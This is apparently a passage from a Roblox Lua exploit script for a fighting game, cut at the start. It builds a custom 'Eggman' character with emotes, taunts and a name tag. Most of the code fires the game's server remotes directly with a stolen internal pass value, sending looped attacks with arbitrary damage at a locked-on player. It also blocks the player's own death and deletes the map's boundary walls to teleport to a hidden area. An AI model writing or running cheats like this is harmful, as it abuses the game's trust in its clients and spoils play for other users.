            local Event = game:GetService("ReplicatedStorage").Remotes.Events
            Event:FireServer(A_1)
    end
    end)
    
    --Kneel Down Emote
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k)
        if k == "v" then 
    local animation = Instance.new("Animation")
    animation.AnimationId = "rbxassetid://7515663367"
    local anim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation)
    anim:Play()
    end
    end)
    
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k) 
        wait(0.2)
        if k == "v" then
            local A_1 = 
                {
                    [1] = getrenv()._G.Pass,
                    [2] = "Chatted", 
                    [3] = "Foolish Choice", 
                    [4] = Color3.new(1, 0, 0),
                }
            local Event = game:GetService("ReplicatedStorage").Remotes.Events
            Event:FireServer(A_1)
    end
    end)
    
    --Shrug Emote
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k)
        if k == "b" then 
    local animation = Instance.new("Animation")
    animation.AnimationId = "rbxassetid://7515663367"
    local anim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation)
    anim:Play()
    end
    end)
    
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k) 
        wait(0.2)
        if k == "b" then
            local A_1 = 
                {
                    [1] = getrenv()._G.Pass,
                    [2] = "Chatted", 
                    [3] = "What a foolish choice you made.", 
                    [4] = Color3.new(1, 0, 0),
                }
            local Event = game:GetService("ReplicatedStorage").Remotes.Events
            Event:FireServer(A_1)
    end
    end)
    
    --Think Emote
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k)
        if k == "n" then 
    local animation = Instance.new("Animation")
    animation.AnimationId = "rbxassetid://7520760067"
    local anim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation)
    anim:Play()
    end
    end)
    
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k) 
        wait(0.2)
        if k == "n" then
            local A_1 = 
                {
                    [1] = getrenv()._G.Pass,
                    [2] = "Chatted", 
                    [3] = "[Omni man] Think Mark, Think!", 
                    [4] = Color3.new(1, 0, 0),
                }
            local Event = game:GetService("ReplicatedStorage").Remotes.Events
            Event:FireServer(A_1)
    end
    end)
    
    

    --//=================================\\
    --||name gui
    --\\=================================//
    
 --headgui
local HealthBar = Instance.new("BillboardGui")
local Frame = Instance.new("Frame")
local HealthLabel = Instance.new("TextLabel")
local PName = Instance.new("TextLabel")

   
--Properties:

HealthBar.Name = "HealthBar"
HealthBar.Parent = player.Character.Head
HealthBar.ExtentsOffset = Vector3.new(0, 3, 0)
HealthBar.Size = UDim2.new(4, 0, 2, 0)

Frame.Parent = HealthBar
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.Size = UDim2.new(1, 0, 1, 0)

HealthLabel.Name = "HealthLabel"
HealthLabel.Parent = Frame
HealthLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HealthLabel.BackgroundTransparency = 1.000
HealthLabel.Position = UDim2.new(0.200000003, 0, 0.200000003, 0)
HealthLabel.Size = UDim2.new(0.800000012, 0, 0.300000012, 0)
HealthLabel.Font = Enum.Font.Arcade
HealthLabel.Text = "The Perfect LifeForm"
HealthLabel.TextColor3 = Color3.fromRGB(255,248,220)
HealthLabel.TextScaled = true
HealthLabel.TextSize = 14.000
HealthLabel.TextWrapped = true
HealthLabel.TextXAlignment = Enum.TextXAlignment.Left

PName.Name = "PName"
PName.Parent = Frame
PName.BackgroundColor3 = Color3.fromRGB(255,248,220)
PName.BackgroundTransparency = 1.000
PName.Position = UDim2.new(-0.899999976, 0, -0.800000012, 0)
PName.Size = UDim2.new(3, 0, 1, 0)
PName.Font = Enum.Font.Arcade
PName.Text = "Eggman Drip"
PName.TextColor3 = Color3.fromRGB(0, 0, 0)
PName.TextScaled = true
PName.TextSize = 5.000
PName.TextStrokeColor3 = Color3.fromRGB(255,0,0)
PName.TextStrokeTransparency = 0.000
PName.TextWrapped = true
PName.TextYAlignment = Enum.TextYAlignment.Top
PName.Rotation = 5




--tween Rotation
local part = PName
        
        local Info = TweenInfo.new(
            2,                              --Length (seconds)
            Enum.EasingStyle.Sine,          --Easing Style
            Enum.EasingDirection.InOut,       --Easing Direction
            -1,                             --Times Repeated
            true,                           --reversed
            0                               --deşau
            )
            
        local Goals = {
            Rotation = -5
        }
        
        local nametween = TweenService:Create(part, Info, Goals)
        nametween:Play()
        
        
        
    
    --//=================================\\
    --||The Fun Stuff
    --||Really cool (Taunts + Secret Map TP)
    --\\=================================//
    --tp bypass
    game.Workspace.Map["MapCFrame"]:Destroy()
    game.Workspace.Map["MapSize"]:Destroy()
    game.Workspace.Map.Model["InvisibleWalls"]:Destroy()
    --Spawn Secret Map
        local newmap = game:GetService("ReplicatedStorage").Resources.Baseplate
        local newmap2 = newmap:Clone()
        newmap2.Name = "Joe"
        newmap2.Parent = game:GetService("Workspace").Map

    local TheFunny = false
    function SecretTp()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1302.91138, 2847.54688, 3280.51807, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        wait(2)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-385.056732, 1117.49927, 1236.89026, 0.0316926986, -0.0196113884, 0.999304831, 0.0301083066, 0.999372423, 0.0186579525, -0.999043584, 0.0294960812, 0.0322632939)
    end
    function TpBack()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1302.91138, 2847.54688, 3280.51807, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        wait(2)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-206.342285, 250.708115, -304.879242, 1, 0, 0, 0, 1, 0, 0, 0, 1) 
    end
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k)
        if k == "e" then if TheFunny == false then 
            TheFunny = true
            SecretTp()
        elseif TheFunny == true then 
            TheFunny = false
            TpBack()
            end
        end 
    end)
    --TP to Map move 
    --//=================================\\
    --||Moves For Phase One
    --||Moves Are Z,X,C and V
    --\\=================================//
--N Move
    game:GetService("UserInputService").InputBegan:Connect(function(key, typing) 
        if typing then return end 
        local button = Enum.KeyCode.Seven
        if key.KeyCode == button then
        local animation = Instance.new("Animation")
        animation.AnimationId = "rbxassetid://7019288804"
        local anim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation)
        anim:Play()
        anim:AdjustSpeed(0.40)
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    Take this!]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
for i = 1,5 do
 game:GetService("ReplicatedStorage").Remotes.CharaMoves:InvokeServer({getrenv()._G.Pass, "KnifeProjectileYellow", "Spawn", Vector3.new(0,500,0)})
       local A_1 = getrenv()._G.Pass
                            local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
                            local A_3 = 
                                {
                                    ["HitTime"] = 1,
                                    ["Type"] = "Normal", 
                                    ["HitEffect"] = "CarrotHitEffect",
                                    ["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt3,
                                    ["Sound"] = game:GetService("ReplicatedStorage").Sounds.ChaosSaberSlice,
                                    ["CameraShake"] = "BigExplosion",
                                    ["Velocity"] = Vector3.new(0,0,2),
                                    ["CombatInv"] = true,
                                    ["Damage"] = 10
                                }
                            local Event = game:GetService("ReplicatedStorage").Remotes.Damage
                            Event:InvokeServer(A_1, A_2, A_3)
       local A_1 = getrenv()._G.Pass
wait(0.05)
                            local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
                            local A_3 = 
                                {
                                    ["HitTime"] = 1,
                                    ["Type"] = "Normal", 
                                    ["HitEffect"] = "KnifeHitEffect",
                                    ["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt3,
                                    ["Sound"] = game:GetService("ReplicatedStorage").Sounds.ChaosSaberSlice,
                                    ["CameraShake"] = "BigExplosion",
                                    ["Velocity"] = Vector3.new(0,0,-2),
                                    ["CombatInv"] = true,
                                    ["Damage"] = 10
                                }
                            local Event = game:GetService("ReplicatedStorage").Remotes.Damage
                            Event:InvokeServer(A_1, A_2, A_3)
end
end
end)
--B Move
    game:GetService("UserInputService").InputBegan:Connect(function(key, typing) 
        if typing then return end 
        local button = Enum.KeyCode.Eight
        if key.KeyCode == button then
        local animation = Instance.new("Animation")
        animation.AnimationId = "rbxassetid://5411089475"
        local anim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation)
        anim:Play()
        wait(0.3)
        anim:AdjustSpeed(0.0)
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    Pushing Power]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
        for _,v in pairs(game:GetService("ReplicatedStorage").RogueEffects:GetChildren()) do
            if v.Name == 'Ignis' then
            local char = game.Players.LocalPlayer.Character
            sword2 = v:Clone()
            sword2.Parent = char
            sword2.Anchored = false
            weld = Instance.new('Weld',sword2)
            weld.Part0 = sword2
            weld.Part1 = char['HumanoidRootPart']
            sword2.Name = 'FlameThing1'
            weld.C0 = CFrame.new(0,2,4)*CFrame.Angles(0,2,0)
            sword2.Transparency = 1
            end
            end
        for _,v in pairs(game:GetService("ReplicatedStorage").RogueEffects:GetChildren()) do
            if v.Name == 'FireEffect' then
            local char = game.Players.LocalPlayer.Character
            sword2 = v:Clone()
            sword2.Parent = char
            sword2.Anchored = false
            weld = Instance.new('Weld',sword2)
            weld.Part0 = sword2
            weld.Part1 = char['HumanoidRootPart']
            sword2.Name = 'FlameThing2'
            weld.C0 = CFrame.new(4,0,0)*CFrame.Angles(0,2,0)
            sword2.Transparency = 1
            end
            end
        for _,v in pairs(game:GetService("ReplicatedStorage").RogueEffects:GetChildren()) do
            if v.Name == 'Ignis' then
            local char = game.Players.LocalPlayer.Character
            sword2 = v:Clone()
            sword2.Parent = char
            sword2.Anchored = false
            weld = Instance.new('Weld',sword2)
            weld.Part0 = sword2
            weld.Part1 = char['HumanoidRootPart']
            sword2.Name = 'FlameThing3'
            weld.C0 = CFrame.new(0,0,4)*CFrame.Angles(-1,0,1)
            sword2.Transparency = 1
            end
            end
for i = 1,10 do
       local A_1 = getrenv()._G.Pass
                            local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
                            local A_3 = 
                                {
                                    ["HitTime"] = 1,
                                    ["Type"] = "Normal", 
                                    ["HitEffect"] = "CarrotHitEffect",
                                    ["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt3,
                                    ["Sound"] = game:GetService("ReplicatedStorage").Sounds.ChaosSaberSlice,
                                    ["CameraShake"] = "BigExplosion",
                                    ["Velocity"] = Vector3.new(0,0,2),
                                    ["CombatInv"] = true,
                                    ["Damage"] = 5
                                }
                            local Event = game:GetService("ReplicatedStorage").Remotes.Damage
                            Event:InvokeServer(A_1, A_2, A_3)
       local A_1 = getrenv()._G.Pass
wait(0.05)
                            local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
                            local A_3 = 
                                {
                                    ["HitTime"] = 1,
                                    ["Type"] = "Normal", 
                                    ["HitEffect"] = "CarrotHitEffect",
                                    ["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt3,
                                    ["Sound"] = game:GetService("ReplicatedStorage").Sounds.ChaosSaberSlice,
                                    ["CameraShake"] = "BigExplosion",
                                    ["Velocity"] = Vector3.new(0,0,-2),
                                    ["CombatInv"] = true,
                                    ["Damage"] = 5
                                }
                            local Event = game:GetService("ReplicatedStorage").Remotes.Damage
                            Event:InvokeServer(A_1, A_2, A_3)
end
                                for _,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                                if v.Name == 'FlameThing1' then
                                    v:Destroy()
                                end
                                end
                                for _,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                                    if v.Name == 'FlameThing2' then
                                        v:Destroy()
                                    end
                                    end
                                for _,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                                    if v.Name == 'FlameThing3' then
                                        v:Destroy()
                                    end
                                    end
anim:Stop()
end
end)
    --the v move
    _G.BegoneThot = true
    game:GetService("UserInputService").InputBegan:Connect(function(key, typing) 
        if typing then return end 
        local button = Enum.KeyCode.Nine
        if key.KeyCode == button then
    if _G.BegoneThot == true then
        local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    Let's see if you can handle this!]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
    wait(0.2)
    char = game.Players.LocalPlayer.Character
    for _,v in pairs(game:GetService("ReplicatedStorage").Resources.LocalScripts:GetChildren()) do
    if v.Name == 'ShortWhiteScreen2' then
        clone = v:Clone()
        clone.Parent = char
    end
    end
    for i = 1,6 do
        local animation = Instance.new("Animation")
        animation.AnimationId = "rbxassetid://5411089475"
        local anim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation)
        anim:Play()
       local A_1 = getrenv()._G.Pass
                            local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
                            local A_3 = 
                                {
                                    ["HitTime"] = 1,
                                    ["Type"] = "Knockback", 
                                    ["HitEffect"] = "KnifeHitEffect",
                                    ["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt3,
                                    ["Sound"] = game:GetService("ReplicatedStorage").Sounds.ChaosSaberSlice,
                                    ["CameraShake"] = "BigExplosion",
                                    ["Velocity"] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 2,
                                    ["CombatInv"] = true,
                                    ["Damage"] = 40
                                }
                            local Event = game:GetService("ReplicatedStorage").Remotes.Damage
                            Event:InvokeServer(A_1, A_2, A_3)
        wait(0.5)
        local animation = Instance.new("Animation")
        animation.AnimationId = "rbxassetid://5657145846"
        local anim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation)
        anim:Play()
    end
    wait(1)
    local animation = Instance.new("Animation")
    animation.AnimationId = "rbxassetid://5776251749"
    local anim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation)
    anim:Play()
       local A_1 = getrenv()._G.Pass
                            local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
                            local A_3 = 
                                {
                                    ["HitTime"] = 1,
                                    ["Type"] = "Knockback", 
                                    ["HitEffect"] = "KnifeHitEffect",
                                    ["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt3,
                                    ["Sound"] = game:GetService("ReplicatedStorage").Sounds.ChaosSaberSlice,
                                    ["CameraShake"] = "BigExplosion",
                                    ["Velocity"] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 199,
                                    ["CombatInv"] = true,
                                    ["Damage"] = 40
                                }
                            local Event = game:GetService("ReplicatedStorage").Remotes.Damage
                            Event:InvokeServer(A_1, A_2, A_3)
                            wait(2.5)
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    Ha How pitiful]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
    wait()
    _G.BegoneThot = false
    wait(3)
    _G.BegoneThot = true
    end
    end
    end)
    
function Death1()
        local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    It appears that even my Drip wasn't strong enough]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function Death2()
        local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    No matter. Even If I was defeated I still won't give up!]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function Death3()
        local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    I can't die with this drip!]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function Death4()
        local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    I refuse to give up before I defeat sonic!]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function Death5()
        local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    It's time to show you the full power of my drip!]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end

    --//=================================\\
    --||Custom Death
    --\\=================================//

    --//=================================\\
    --||Moves Z/Players
    --\\=================================//

    game.Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
        if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
        game.Players.LocalPlayer.Character.Humanoid.Health = 1
        end
    end)
    
    --//=================================\\
    --||Moves X
    --\\=================================//
    
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k) 
        if k == "0" then 
    local A_1 =
                {
                    [1] = getrenv()._G.Pass,
                    [2] = "Chatted", 
                    [3] = "[Eggman] No More Running!.", 
                    [4] = Color3.new(1,1,1)
                }
            local Event = game:GetService("ReplicatedStorage").Remotes.Events
            Event:FireServer(A_1)
    local A_1 = getrenv()._G.Pass
    local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
    local A_3 = 
    {
        ["HitTime"] = 1, 
        ["Type"] = "Knockback", 
        ["HitEffect"] = "HeavyHitEffect", 
        ["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Stunned, 
        ["Sound"] = game:GetService("ReplicatedStorage").Sounds.Knockback, 
        ["Damage"] = 10
    }
    local Event = game:GetService("ReplicatedStorage").Remotes.Damage
    Event:InvokeServer(A_1, A_2, A_3)
        end
    end)
    
    --//=================================\\
    --||Moves C 
    --\\=================================//
    
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k) 
        if k == "-" then game.Players.LocalPlayer:GetMouse()
            local A_1 = 
                {
                    [1] = getrenv()._G.Pass,
                    [2] = "Chatted", 
                    [3] = "[Eggman] Just Die!", 
                    [4] = Color3.new(1,1,1)
                }
            local Event = game:GetService("ReplicatedStorage").Remotes.Events
            Event:FireServer(A_1)
            local Anim = Instance.new("Animation")
            Anim.AnimationId = "rbxassetid://3816275001"
            local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
            k:Play()
            k:AdjustSpeed(2)
            local args = { 
                [1] = getrenv()._G.Pass,
                [2] = game:service("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value,
                [3] = {
                    ["HitTime"] = 1,
                    ["Type"] = "Knockback",
                    ["HitEffect"] = "BoneHitEffect",
                    ["VictimCFrame"] = CFrame.new(Vector3.new(957.38525390625, -2.7168080806732, 271.31875610352), Vector3.new(0.90182185173035, 0.0016235302900895, 0.43210506439209)),
                    ["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Knockback2,
                    ["Velocity"] = Vector3.new(0, 0, 200),
                    ["Sound"] = game:GetService("ReplicatedStorage").Sounds.Knockback,
                    ["Damage"] = 40
                }
            }
    
    
            game:GetService("ReplicatedStorage").Remotes.Damage:InvokeServer(unpack(args))
            wait(99999)
            k:Stop()
        end
    end)

    --//=================================\\
    --||Moves G a.k.a heal
    --\\=================================//
    
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k) 
        if k == "=" then wait(0) 
    local args = {
            [1] = {
                [1] = getrenv()._G.Pass,
                [2] = "KnifeHeal",
            }
        }
        game:GetService("ReplicatedStorage").Remotes.CharaMoves:InvokeServer(unpack(args))
    end
    end)
    --//=================================\\
    --||Visualizer
    --\\=================================//
local parts = {}

local rainbow = {}
for i = 0,1,1/100 do
	local color = Color3.fromHSV(i,1,1)
	table.insert(rainbow,color)
end

local HumanoidRootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
for i = 1,200 do
	local p = Instance.new('Part')
	p.Shape = 'Ball'
	p.TopSurface=10
	p.BottomSurface=10
	p.Size = Vector3.new(.2,.2,.2)
	p.Anchored=true
	p.CanCollide = false
	table.insert(parts,p)
	p.Parent = HumanoidRootPart
	p.Material = 'Neon'
end
local currcol = 0
spawn(function()
	while wait(.1) do
		local color
		currcol = currcol + 1
		if rainbow[currcol] then
			color = rainbow[currcol]
		else
			currcol = 1
			color = rainbow[1]
		end
		spawn(function()
		for i,v in pairs(parts) do
			v.Color = color
			--game:service'RunService'.RenderStepped:wait()
		end
		end)
	end
end)
local s = Instance.new('Sound',HumanoidRootPart)
s.SoundId = 'rbxassetid://7795247080'
s.Looped = true
s.Volume = 10
s:Play()
rot = 1
game.Players.LocalPlayer.Chatted:connect(function(message)
	if message:sub(1,4) == 'play' then
		s:Stop()
		s.SoundId = 'rbxassetid://'..message:sub(6)
		s:Play()
	end
end)
game:service'RunService'.RenderStepped:connect(function()
	local deb = s.PlaybackLoudness/200
	rot = rot + deb/2
	for i,v in pairs(parts) do
		local angle = math.rad(i*(360/#parts) + rot)
		v.CFrame = v.CFrame:lerp(CFrame.new(HumanoidRootPart.Position.X,3,HumanoidRootPart.Position.Z)
			* CFrame.Angles(math.rad(90),0,0)
			* CFrame.new(0,0,1.7)
			* CFrame.Angles(0,0,angle)
			* CFrame.new(0,math.sin(tick()+i)*deb + 3,1)
		,.2)
	end
end)
    --//=================================\\
    --||Drip
    --\\=================================//
game.Players.LocalPlayer.Character.Shirt.ShirtTemplate = "rbxassetid://6202682266"
game.Players.LocalPlayer.Character.Pants.PantsTemplate = "rbxassetid://4056027321"
while true do
    wait()
    local Lighting = game:GetService("Lighting")
    Lighting.ClockTime = time
    Lighting.ClockTime = "10" - s.PlaybackLoudness/100
    workspace.Camera.FieldOfView = 70 - s.PlaybackLoudness/100
end

end)

    end)

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.BackgroundTransparency = 1.000
TextButton_2.Position = UDim2.new(0.425135791, 0, 0.515924215, 0)
TextButton_2.Size = UDim2.new(0, 104, 0, 52)
TextButton_2.Font = Enum.Font.Arcade
TextButton_2.Text = "NO"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextSize = 84.000
TextButton_2.MouseEnter:Connect(function()
    TextButton_2.TextColor3 = Color3.fromRGB(181,126,220)
  end)
  TextButton_2.MouseLeave:Connect(function()
    TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
  end)
TextButton_2.MouseButton1Down:connect(function()
Frame:Destroy()
TextButton:Destroy()
TextLabel:Destroy()
TextButton_2:Destroy()

end)